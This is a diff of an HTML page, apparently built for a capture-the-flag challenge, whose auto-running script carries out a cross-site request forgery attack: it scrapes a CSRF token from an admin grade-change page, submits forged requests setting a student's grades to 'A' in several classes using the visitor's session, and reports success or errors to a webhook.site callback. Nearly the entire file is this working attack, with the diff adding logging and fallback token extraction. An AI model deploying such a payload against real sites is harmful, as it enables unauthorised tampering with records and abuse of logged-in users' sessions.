@@ -5,8 +5,16 @@
 </head>
 <body>
     <h2>Administrative Grade Update in Progress...</h2>
+    <div id="debug" style="white-space: pre-wrap; font-family: monospace; background: #f0f0f0; padding: 10px;"></div>
     
     <script>
+    // Debug output
+    const debugEl = document.getElementById('debug');
+    function log(message) {
+        debugEl.textContent += message + '\n';
+        console.log(message);
+    }
+
     // YOUR INFORMATION
     const YOUR_STUDENT_ID = 'cec61aee-395d-4281-af96-cfe05bda466e';
     const YOUR_CLASS_IDS = [
@@ -19,47 +27,87 @@
 
     async function changeGrades() {
         try {
-            console.log('Starting grade change process...');
+            log('=== STARTING GRADE CHANGE PROCESS ===');
+            log(`Target Student: ${YOUR_STUDENT_ID}`);
+            log(`Target Classes: ${YOUR_CLASS_IDS.join(', ')}`);
             
             // 1. First get the CSRF token from the grade-change page
-            console.log('Fetching CSRF token...');
+            log('\n[1] Fetching CSRF token from /grade-change...');
             const response = await fetch('https://gradebook-admin.ctf.csaw.io/grade-change', {
                 credentials: 'include',
                 headers: {
-                    'Cache-Control': 'no-cache'
+                    'Cache-Control': 'no-cache',
+                    'Pragma': 'no-cache'
                 }
             });
             
+            log(`Response Status: ${response.status} ${response.statusText}`);
+            log(`Response URL: ${response.url}`);
+            log(`Response Headers: ${JSON.stringify([...response.headers], null, 2)}`);
+            
             if (!response.ok) {
-                throw new Error(`Failed to fetch grade-change page: ${response.status}`);
+                throw new Error(`Failed to fetch grade-change page: ${response.status} ${response.statusText}`);
             }
             
             const html = await response.text();
-            console.log('Grade-change page loaded');
+            log(`Response Length: ${html.length} characters`);
+            log('First 500 chars of response:');
+            log(html.substring(0, 500) + (html.length > 500 ? '...' : ''));
             
             // Extract CSRF token from the HTML
+            log('\n[2] Extracting CSRF token...');
             const parser = new DOMParser();
             const doc = parser.parseFromString(html, 'text/html');
-            const csrfInput = doc.querySelector('input[name="csrf_token"]');
             
-            if (!csrfInput) {
-                // Alternative: look for meta tag or other CSRF token locations
-                const metaToken = doc.querySelector('meta[name="csrf-token"]');
-                if (metaToken) {
-                    csrfToken = metaToken.getAttribute('content');
+            // Look for CSRF token in multiple possible locations
+            let csrfToken = null;
+            const csrfInput = doc.querySelector('input[name="csrf_token"]');
+            const csrfMeta = doc.querySelector('meta[name="csrf-token"]');
+            const csrfMetaContent = doc.querySelector('meta[name="csrf_token"]');
+            
+            if (csrfInput) {
+                csrfToken = csrfInput.value;
+                log(`✓ Found CSRF token in input field: ${csrfToken}`);
+            } else if (csrfMeta) {
+                csrfToken = csrfMeta.getAttribute('content');
+                log(`✓ Found CSRF token in meta tag: ${csrfToken}`);
+            } else if (csrfMetaContent) {
+                csrfToken = csrfMetaContent.getAttribute('content');
+                log(`✓ Found CSRF token in meta content: ${csrfToken}`);
+            } else {
+                // Search for CSRF token in the entire page
+                const csrfRegex = /csrf.*token.*value.*["']([^"']+)["']/i;
+                const match = html.match(csrfRegex);
+                if (match) {
+                    csrfToken = match[1];
+                    log(`✓ Found CSRF token via regex: ${csrfToken}`);
                 } else {
-                    throw new Error('CSRF token not found in page');
+                    log('✗ CSRF token not found! Searching entire page...');
+                    // Last resort: look for any input with "csrf" in name
+                    const allInputs = doc.querySelectorAll('input');
+                    for (const input of allInputs) {
+                        if (input.name && input.name.toLowerCase().includes('csrf')) {
+                            csrfToken = input.value;
+                            log(`✓ Found CSRF token in input[name="${input.name}"]: ${csrfToken}`);
+                            break;
+                        }
+                    }
                 }
             }
             
-            const csrfToken = csrfInput.value;
-            console.log('CSRF Token found:', csrfToken);
+            if (!csrfToken) {
+                throw new Error('CSRF token not found in page. Page content: ' + html.substring(0, 1000));
+            }
+            
+            log(`Final CSRF Token: ${csrfToken}`);
             
             // 2. Change grades for each class
+            log('\n[3] Changing grades...');
             let successCount = 0;
             
-            for (const classId of YOUR_CLASS_IDS) {
-                console.log(`Changing grade for class ${classId}...`);
+            for (let i = 0; i < YOUR_CLASS_IDS.length; i++) {
+                const classId = YOUR_CLASS_IDS[i];
+                log(`\n--- Changing grade for class ${i+1}/${YOUR_CLASS_IDS.length}: ${classId} ---`);
                 
                 const formData = new FormData();
                 formData.append('student_id', YOUR_STUDENT_ID);
@@ -67,49 +115,101 @@
                 formData.append('grade', 'A');
                 formData.append('csrf_token', csrfToken);
                 
-                const changeResponse = await fetch('https://gradebook-admin.ctf.csaw.io/grade-change', {
-                    method: 'POST',
-                    body: formData,
-                    credentials: 'include',
-                    headers: {
-                        'Referer': 'https://gradebook-admin.ctf.csaw.io/grade-change'
-                    }
-                });
-                
-                const resultText = await changeResponse.text();
-                console.log(`Class ${classId} result:`, changeResponse.status, resultText.substring(0, 100));
-                
-                if (changeResponse.ok) {
-                    successCount++;
+                log('FormData contents:');
+                for (const [key, value] of formData.entries()) {
+                    log(`  ${key}: ${value}`);
                 }
                 
-                // Small delay between requests to avoid rate limiting
-                await new Promise(resolve => setTimeout(resolve, 500));
+                try {
+                    const changeResponse = await fetch('https://gradebook-admin.ctf.csaw.io/grade-change', {
+                        method: 'POST',
+                        body: formData,
+                        credentials: 'include',
+                        headers: {
+                            'Referer': 'https://gradebook-admin.ctf.csaw.io/grade-change',
+                            'Origin': 'https://gradebook-admin.ctf.csaw.io'
+                        }
+                    });
+                    
+                    log(`POST Response: ${changeResponse.status} ${changeResponse.statusText}`);
+                    log(`POST Response URL: ${changeResponse.url}`);
+                    
+                    const resultText = await changeResponse.text();
+                    log(`POST Response Length: ${resultText.length} chars`);
+                    log(`POST Response Preview: ${resultText.substring(0, 200)}${resultText.length > 200 ? '...' : ''}`);
+                    
+                    if (changeResponse.ok) {
+                        successCount++;
+                        log('✓ Grade change successful!');
+                    } else {
+                        log('✗ Grade change failed');
+                    }
+                    
+                } catch (postError) {
+                    log(`✗ POST Error: ${postError.message}`);
+                }
+                
+                // Small delay between requests
+                if (i < YOUR_CLASS_IDS.length - 1) {
+                    log('Waiting 1 second before next request...');
+                    await new Promise(resolve => setTimeout(resolve, 1000));
+                }
             }
             
             // 3. Send confirmation to webhook
-            console.log('Sending results to webhook...');
-            await fetch('https://webhook.site/adba0a28-6810-4262-9e4e-08d620900ebb', {
-                method: 'POST',
-                mode: 'no-cors',
-                body: `Successfully changed ${successCount}/5 grades for student ${YOUR_STUDENT_ID} at ${new Date().toISOString()}`
-            });
+            log('\n[4] Sending results to webhook...');
+            try {
+                const webhookResponse = await fetch('https://webhook.site/adba0a28-6810-4262-9e4e-08d620900ebb', {
+                    method: 'POST',
+                    mode: 'no-cors',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        student_id: YOUR_STUDENT_ID,
+                        success_count: successCount,
+                        total_classes: YOUR_CLASS_IDS.length,
+                        timestamp: new Date().toISOString(),
+                        status: 'completed'
+                    })
+                });
+                log('✓ Webhook notification sent');
+            } catch (webhookError) {
+                log(`✗ Webhook error: ${webhookError.message}`);
+            }
             
-            console.log('Grade change process completed!');
+            log(`\n=== PROCESS COMPLETED ===`);
+            log(`Successfully changed ${successCount}/${YOUR_CLASS_IDS.length} grades`);
             
         } catch (error) {
-            console.error('Error:', error);
+            log(`\n=== ERROR ===`);
+            log(`Error: ${error.message}`);
+            log(`Stack: ${error.stack}`);
+            
             // Send error to webhook
-            await fetch('https://webhook.site/adba0a28-6810-4262-9e4e-08d620900ebb', {
-                method: 'POST',
-                mode: 'no-cors',
-                body: `Error: ${error.message} at ${new Date().toISOString()}`
-            });
+            try {
+                await fetch('https://webhook.site/adba0a28-6810-4262-9e4e-08d620900ebb', {
+                    method: 'POST',
+                    mode: 'no-cors',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        error: error.message,
+                        stack: error.stack,
+                        timestamp: new Date().toISOString(),
+                        status: 'error'
+                    })
+                });
+            } catch (webhookError) {
+                log(`Also failed to send error to webhook: ${webhookError.message}`);
+            }
         }
     }
 
-    // Execute when page loads with a small delay
-    setTimeout(changeGrades, 1000);
+    // Execute when page loads
+    log('Page loaded. Starting in 2 seconds...');
+    setTimeout(changeGrades, 2000);
     </script>
 </body>
 </html>
